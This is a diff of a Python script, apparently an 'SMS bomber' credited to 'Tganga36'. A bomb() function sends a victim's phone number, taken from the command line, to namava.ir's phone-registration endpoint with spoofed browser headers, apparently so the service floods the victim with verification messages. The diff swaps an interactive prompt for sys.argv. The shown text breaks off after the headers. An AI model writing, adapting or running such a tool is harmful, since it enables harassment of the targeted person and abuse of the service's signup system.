@@ -1,16 +1,8 @@
 from colorama.initialise import init
 import requests
-from requests.api import post, request
-import time
-import os , platform
 from colorama import Fore
 import sys
 init()
-data0 = platform.uname()[0]
-if data0 == 'Linux':
-    os.system('clear')
-else:
-    os.system('cls')
 print()
 print(Fore.YELLOW + '''▒█░▒█ ░▀░ █▀▀█ █▀▀█ █▀▀ █░░█ ░▀░ █▀▄▀█ █▀▀█ 
 ▒█▀▀█ ▀█▀ █▄▄▀ █░░█ ▀▀█ █▀▀█ ▀█▀ █░▀░█ █▄▄█ 
@@ -18,8 +10,7 @@ print(Fore.YELLOW + '''▒█░▒█ ░▀░ █▀▀█ █▀▀█ █�
 print()  
 print('Created By Tganga36')
 print() 
-phone = input(Fore.LIGHTGREEN_EX + '[+]' + Fore.LIGHTWHITE_EX + ' Enter Phone Number(09........):')
-print()
+phone = sys.argv[1]
 def bomb():
     nmj = {"UserName":f"{phone}"}
     nmh = {'Host': 'www.namava.ir' , 'Content-Length':'28' , 'Accept':'application/json, text/plain, */*' , 'Accept-Encoding' : 'gzip, deflate, br' , 'Accept-Language':'en-US,en;q=0.5' , 'Connection':'keep-alive' , 'Content-Type':'application/json;charset=utf-8' , 'Referer':'https://www.namava.ir/auth/register-phone' , 'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0'}
